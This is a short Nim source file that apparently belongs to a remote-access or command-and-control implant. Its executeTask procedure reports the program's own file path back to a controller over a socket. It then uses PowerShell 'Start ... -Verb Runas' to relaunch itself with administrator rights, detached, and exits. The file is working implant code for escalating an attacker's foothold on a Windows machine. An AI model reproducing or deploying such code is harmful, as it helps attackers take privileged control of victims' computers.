import net, os, osproc, json
import ../client/communication

proc executeTask*(socket: Socket, taskId: int, params: seq[string]) =
  let taskOutput = TaskOutput(
    task: "output",
    taskId: taskId,
    error: "",
    data: %*{}
  )

  var filePath = getAppFileName()

  taskOutput.addData(Text, "path", "Current app path is: " & filePath)
  socket.sendOutput(taskOutput)
  
  # socket.close()

  discard execCmdEx(
    "Powershell.exe Start " & filePath & " -Verb Runas",
    options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon}
  )

  quit()